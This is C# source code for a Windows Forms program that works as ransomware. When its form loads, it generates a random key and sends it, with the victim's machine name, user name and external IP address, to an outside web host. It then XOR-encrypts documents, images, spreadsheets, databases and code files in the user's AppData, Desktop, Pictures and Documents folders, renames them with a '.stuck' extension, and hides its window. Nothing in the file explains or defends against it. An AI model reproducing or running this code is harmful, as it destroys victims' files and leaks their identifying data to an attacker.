using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.IO;

namespace TengoQueDecirteAlgo
{
    public partial class Form1 : Form
    {
        string urlKey = "https://noscreaming.000webhostapp.com/write.php?info=";
        string externalip = new WebClient().DownloadString("http://icanhazip.com");
        string userName = Environment.UserName;
        string nameMachine = Environment.MachineName;
        /*
         string direct1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
         string direct2 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
         string direct3 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
         string direct4 = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
         */
        string[] location = { Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), Environment.GetFolderPath(Environment.SpecialFolder.Desktop), Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) };

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            startProcess();
        }
        
        void startProcess()
        {
            string aleatoryKey = getKey(40);
            sendKey(aleatoryKey);
            startEnc(location, aleatoryKey);
            aleatoryKey = null;
            Form2 frm2 = new Form2();
            frm2.Show();
            this.Visible = false;
        }

        void startEnc(string[] location, string key)
        {
            byte[] bytesKey = Encoding.ASCII.GetBytes(key);

            var validExtensions = new[] { ".txt", ".jpeg", ".mp4", ".doc", ".ods", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd" }; 

            foreach(string direct in location)
            {
                string[] files = Directory.GetFiles(direct);
                foreach (string file in files)
                {
                    try 
                    {
                        string fileExtension = Path.GetExtension(file);
                        if (validExtensions.Contains(fileExtension))
                        {
                            byte[] fileBytes = File.ReadAllBytes(file);
                            byte[] getBytes = enc(fileBytes, bytesKey);
                            File.WriteAllBytes(file, getBytes);
                            File.Move(file, file + ".stuck");
                        }
                    } catch { }
                }
            }
        }

        string getKey(int numberOfDigit)
        {
            StringBuilder sBP = new StringBuilder();
            string validChar = "abcdeABCDEFGHIJKLMNOPQR123456789STUVWXYZfghijklmnopqrstuvwxyz";
            Random rnd = new Random();
            while (0 < numberOfDigit--) 
            {
                sBP.Append(validChar[rnd.Next(0, validChar.Length)]);
            }
            return sBP.ToString();
        }
        
        void sendKey(string key)
        {
            string indetify = nameMachine + "-" + userName + "-" + externalip + "-" + key;
            var allComp = urlKey + indetify;
            var access = new WebClient().DownloadString(allComp);
        }

        Byte[] enc(byte[] filesBytes, byte[] keyBytes)
        {
            for(int i = 0; i < filesBytes.Length; i++)
            {
                filesBytes[i] ^= keyBytes[i % keyBytes.Length];
            }
            return filesBytes;
        }
    }
}
